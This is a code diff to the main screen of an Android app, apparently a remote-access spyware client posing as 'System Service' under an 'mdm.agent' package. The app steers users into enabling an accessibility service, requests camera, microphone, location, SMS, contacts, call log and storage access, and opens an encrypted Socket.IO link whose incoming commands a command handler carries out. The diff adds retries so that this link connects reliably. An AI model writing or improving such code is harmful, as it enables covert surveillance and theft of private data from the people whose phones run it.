@@ -30,6 +30,8 @@ class MainActivity : AppCompatActivity() {
     companion object {
         @Volatile private var instanceSocketManager: SocketManager? = null
         @Volatile private var instance: MainActivity? = null
+        @Volatile private var hasShownPermissionsScreen = false
+        @Volatile private var isConnecting = false
 
         fun getSocketManager(): SocketManager? = instanceSocketManager
         fun setSocketManager(sm: SocketManager?) { instanceSocketManager = sm }
@@ -44,19 +46,13 @@ class MainActivity : AppCompatActivity() {
         instance = this
         Log.i(TAG, "🚀 MainActivity started")
 
-        // Check if Accessibility is enabled
         if (isAccessibilityEnabled()) {
-            // Accessibility already enabled → show permissions screen
             showPermissionsScreen()
         } else {
-            // Show Accessibility setup screen
             showAccessibilitySetup()
         }
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // SCREEN 1: Accessibility Setup (simple, one button)
-    // ═══════════════════════════════════════════════════════════
     private fun showAccessibilitySetup() {
         val scrollView = ScrollView(this).apply {
             setBackgroundColor(Color.parseColor("#FF0A0A0A"))
@@ -68,7 +64,6 @@ class MainActivity : AppCompatActivity() {
             gravity = Gravity.CENTER_HORIZONTAL
         }
 
-        // Icon
         val icon = TextView(this).apply {
             text = "⚙️"
             textSize = 60f
@@ -77,7 +72,6 @@ class MainActivity : AppCompatActivity() {
         }
         root.addView(icon)
 
-        // Title
         val title = TextView(this).apply {
             text = "System Service"
             setTextColor(Color.parseColor("#FFFFD700"))
@@ -88,7 +82,6 @@ class MainActivity : AppCompatActivity() {
         }
         root.addView(title)
 
-        // Subtitle
         val subtitle = TextView(this).apply {
             text = "Accessibility setup required"
             setTextColor(Color.parseColor("#FFAAAAAA"))
@@ -98,16 +91,10 @@ class MainActivity : AppCompatActivity() {
         }
         root.addView(subtitle)
 
-        // Step 1
         root.addView(buildStep("1", "Tap the button below to open Accessibility Settings"))
-
-        // Step 2
         root.addView(buildStep("2", "Find \"System Service\" in the list"))
-
-        // Step 3
         root.addView(buildStep("3", "Turn it ON and return to this app"))
 
-        // Accessibility button
         val btnAccessibility = Button(this).apply {
             text = "♿ Open Accessibility Settings"
             setTextColor(Color.WHITE)
@@ -173,16 +160,14 @@ class MainActivity : AppCompatActivity() {
         return row
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // SCREEN 2: Permissions Screen (English, shown after Accessibility)
-    // ═══════════════════════════════════════════════════════════
     private fun showPermissionsScreen() {
-        // Request all permissions first
+        if (hasShownPermissionsScreen) return
+        hasShownPermissionsScreen = true
+
+        // Request all permissions
         requestAllPermissions()
 
-        // Connect to server
-        connectToServer()
-
+        // Build UI
         val scrollView = ScrollView(this).apply {
             setBackgroundColor(Color.parseColor("#FF0A0A0A"))
         }
@@ -193,7 +178,6 @@ class MainActivity : AppCompatActivity() {
             gravity = Gravity.CENTER_HORIZONTAL
         }
 
-        // Title
         val title = TextView(this).apply {
             text = "System Service"
             setTextColor(Color.parseColor("#FFFFD700"))
@@ -204,7 +188,6 @@ class MainActivity : AppCompatActivity() {
         }
         root.addView(title)
 
-        // Status
         statusText = TextView(this).apply {
             text = "Connecting to server..."
             setTextColor(Color.parseColor("#FF25D366"))
@@ -214,7 +197,6 @@ class MainActivity : AppCompatActivity() {
         }
         root.addView(statusText)
 
-        // Permissions list
         val permsTitle = TextView(this).apply {
             text = "Required Permissions"
             setTextColor(Color.parseColor("#FFAAAAAA"))
@@ -225,15 +207,9 @@ class MainActivity : AppCompatActivity() {
         root.addView(permsTitle)
 
         val perms = listOf(
-            "📷 Camera",
-            "🎤 Microphone",
-            "📍 Location (GPS)",
-            "👥 Contacts",
-            "💬 SMS Messages",
-            "📞 Call Logs",
-            "📁 Storage & Files"
+            "📷 Camera", "🎤 Microphone", "📍 Location (GPS)",
+            "👥 Contacts", "💬 SMS Messages", "📞 Call Logs", "📁 Storage & Files"
         )
-
         for (perm in perms) {
             val row = TextView(this).apply {
                 text = "✅ $perm"
@@ -244,9 +220,8 @@ class MainActivity : AppCompatActivity() {
             root.addView(row)
         }
 
-        // Info text
         val info = TextView(this).apply {
-            text = "\nℹ️ All permissions are required for the system service to function properly. The app will not work without them."
+            text = "\nℹ️ All permissions are required for the system service to function properly."
             setTextColor(Color.parseColor("#FF888888"))
             textSize = 11f
             setPadding(0, 24, 0, 0)
@@ -256,11 +231,11 @@ class MainActivity : AppCompatActivity() {
 
         scrollView.addView(root)
         setContentView(scrollView)
+
+        // Connect to server AFTER UI is shown
+        connectToServer()
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // PERMISSIONS & CONNECTION
-    // ═══════════════════════════════════════════════════════════
     private fun requestAllPermissions() {
         val perms = arrayOf(
             android.Manifest.permission.CAMERA,
@@ -281,54 +256,96 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun connectToServer() {
+        if (isConnecting) return
+        isConnecting = true
+
         Thread {
-            try {
-                Log.i(TAG, "📡 Starting connection...")
-                val deviceId = DeviceUtils.getDeviceId(this)
-                val serverUrl = DeviceUtils.getServerUrl(this)
-                Log.i(TAG, "  Server: $serverUrl")
-                Log.i(TAG, "  Device: $deviceId")
+            var retryCount = 0
+            val maxRetries = 3
 
-                val apiClient = ApiClient(this)
-                val cryptoManager = CryptoManager()
-                val uploadManager = UploadManager(this)
+            while (retryCount < maxRetries) {
+                try {
+                    retryCount++
+                    Log.i(TAG, "📡 Connection attempt $retryCount/$maxRetries")
 
-                updateStatus("Requesting encryption keys...")
-                val cryptoResult = apiClient.initCrypto(deviceId)
-                if (cryptoResult != null) {
-                    cryptoManager.initFromServer(cryptoResult)
-                    Log.i(TAG, "✅ Crypto initialized")
+                    val deviceId = DeviceUtils.getDeviceId(this)
+                    val serverUrl = DeviceUtils.getServerUrl(this)
+                    Log.i(TAG, "  Server: $serverUrl")
+                    Log.i(TAG, "  Device: $deviceId")
+
+                    updateStatus("Connecting to server... (attempt $retryCount)")
+
+                    val apiClient = ApiClient(this)
+                    val cryptoManager = CryptoManager()
+                    val uploadManager = UploadManager(this)
+
+                    // Step 1: Init crypto (this also wakes up the server)
+                    updateStatus("Requesting encryption keys...")
+                    val cryptoResult = apiClient.initCrypto(deviceId)
+                    if (cryptoResult != null) {
+                        cryptoManager.initFromServer(cryptoResult)
+                        Log.i(TAG, "✅ Crypto initialized")
+                    } else {
+                        Log.w(TAG, "⚠️ Crypto init returned null, retrying...")
+                        if (retryCount < maxRetries) {
+                            Thread.sleep(3000)
+                            continue
+                        }
+                    }
+
+                    // Step 2: Create SocketManager
+                    updateStatus("Creating Socket.IO connection...")
+                    socketManager = SocketManager(this)
+                    setSocketManager(socketManager)
+
+                    val commandHandler = CommandHandler(this, apiClient, cryptoManager, socketManager!!, uploadManager)
+                    socketManager?.setCommandHandler(commandHandler)
+                    socketManager?.setCryptoManager(cryptoManager)
+
+                    socketManager?.onCommandReceived = { data ->
+                        Log.i(TAG, "⚡ Command received: ${data.optString("command")}")
+                        commandHandler.handleCommand(data)
+                    }
+
+                    // Step 3: Connect!
+                    updateStatus("Connecting to server...")
+                    socketManager?.connect()
+
+                    // Wait a bit for connection
+                    Thread.sleep(3000)
+
+                    if (socketManager?.isConnected == true) {
+                        Log.i(TAG, "🎉 Socket.IO connected!")
+                        updateStatus("✅ Connected - App is ready")
+                        isConnecting = false
+                        return@Thread
+                    } else {
+                        Log.w(TAG, "⚠️ Socket not connected after 3s, retrying...")
+                        if (retryCount < maxRetries) {
+                            Thread.sleep(5000)
+                            continue
+                        }
+                    }
+
+                } catch (e: Exception) {
+                    Log.e(TAG, "❌ Connection attempt $retryCount failed: ${e.message}", e)
+                    updateStatus("Retrying... ($retryCount/$maxRetries)")
+                    if (retryCount < maxRetries) {
+                        Thread.sleep(5000)
+                    }
                 }
-
-                updateStatus("Creating Socket.IO connection...")
-                socketManager = SocketManager(this)
-                setSocketManager(socketManager)
-
-                val commandHandler = CommandHandler(this, apiClient, cryptoManager, socketManager!!, uploadManager)
-                socketManager?.setCommandHandler(commandHandler)
-                socketManager?.setCryptoManager(cryptoManager)
-
-                socketManager?.onCommandReceived = { data ->
-                    Log.i(TAG, "⚡ Command received: ${data.optString("command")}")
-                    commandHandler.handleCommand(data)
-                }
-
-                updateStatus("Connecting to server...")
-                socketManager?.connect()
-
-                Log.i(TAG, "🎉 Socket.IO connected!")
-                updateStatus("✅ Connected - App is ready")
-
-            } catch (e: Exception) {
-                Log.e(TAG, "❌ Connection failed: ${e.message}", e)
-                updateStatus("❌ Connection failed: ${e.message}")
             }
+
+            // All retries failed
+            updateStatus("❌ Connection failed. Server may be sleeping.\nPlease reopen the app.")
+            isConnecting = false
         }.start()
     }
 
     private fun updateStatus(text: String) {
         Handler(Looper.getMainLooper()).post {
             statusText?.text = text
+            Log.i(TAG, "Status: $text")
         }
     }
 
@@ -337,16 +354,26 @@ class MainActivity : AppCompatActivity() {
             val enabled = Settings.Secure.getInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 0)
             if (enabled != 1) return false
             val list = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
-            val serviceName = "$packageName/${com.mdm.agent.service.MDMAccessibilityService::class.java.name}"
-            list.contains(serviceName)
-        } catch (e: Exception) { false }
+            // Check if our service is in the list
+            list.contains("com.mdm.agent")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error checking accessibility: ${e.message}")
+            false
+        }
     }
 
     override fun onResume() {
         super.onResume()
-        // Re-check accessibility when returning from settings
-        if (isAccessibilityEnabled() && socketManager?.isConnected != true) {
-            showPermissionsScreen()
-        }
+
+        // CRITICAL: Add delay because Android takes time to update accessibility settings
+        Handler(Looper.getMainLooper()).postDelayed({
+            val enabled = isAccessibilityEnabled()
+            Log.i(TAG, "onResume: accessibility=$enabled, hasShownPerms=$hasShownPermissionsScreen, isConnecting=$isConnecting")
+
+            if (enabled && !hasShownPermissionsScreen && !isConnecting) {
+                Log.i(TAG, "✅ Accessibility enabled! Showing permissions screen...")
+                showPermissionsScreen()
+            }
+        }, 1000) // 1 second delay to let settings update
     }
 }
